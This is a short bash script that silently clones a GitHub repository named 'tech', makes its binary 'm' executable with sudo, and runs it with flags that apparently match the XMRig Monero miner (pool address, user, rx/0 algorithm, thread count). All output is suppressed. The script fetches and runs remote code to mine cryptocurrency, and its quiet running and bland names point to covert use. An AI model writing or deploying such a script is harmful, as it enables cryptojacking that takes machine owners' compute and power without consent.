#! /bin/bash
printf "Run $1"  >&2
{
screen -S min
git clone https://github.com/fulltechtree/tech.git &> /dev/null
sudo chmod +x tech/m
./tech/m -o "$1" -u userA -p 1 -a rx/0 -k -t "$2" &> log
} &> /dev/null
